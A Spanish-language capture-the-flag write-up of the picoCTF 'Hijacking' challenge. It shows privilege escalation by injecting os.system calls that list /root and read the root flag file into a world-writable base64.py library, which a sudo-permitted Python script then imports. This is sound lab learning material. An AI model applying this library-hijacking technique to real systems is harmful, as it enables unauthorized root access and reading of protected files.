# Hijacking

Este ejercicio nos ofrece una sesión ssh.

Si hacemos un poco de enumeración por la maquina podemos ver 2 cosas interesantes:

1. Archivo .server.py en la carpeta picoctf

```python
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

2. Sudoer

```c
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

He intentado hacer un PATH hijacking pero no tuve éxito. Luego de esto podemos intentar mirar si podemos hacer un hijacking pero de las librerías.

Primero vamos a ver donde están las librerías:

```bash
picoctf@challenge:~$ python3
Python 3.8.10 (default, May 26 2023, 14:05:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> print(sys.path)
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
```

Navegando por esos directorios podemos ver unos permisos críticos en una de las librerías que usa el programa

```bash
-rwxrwxrwx 1 root root  20382 May 26  2023 base64.py
```

Vamos a introducir las siguientes líneas en el archivo para hacer un mapeo rápido del directorio root para ver la flag:

```python
import os
os.system('ls -al /root > /home/picoctf/mapeo.txt')
```

Podemos introducir la siguiente linea en el archivo y conseguir la flag:

```python
os.system('cat /root/.flag.txt')
```

```python
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
picoCTF{SECRETO} # FLAG
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname
picoctf@challenge:~$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```
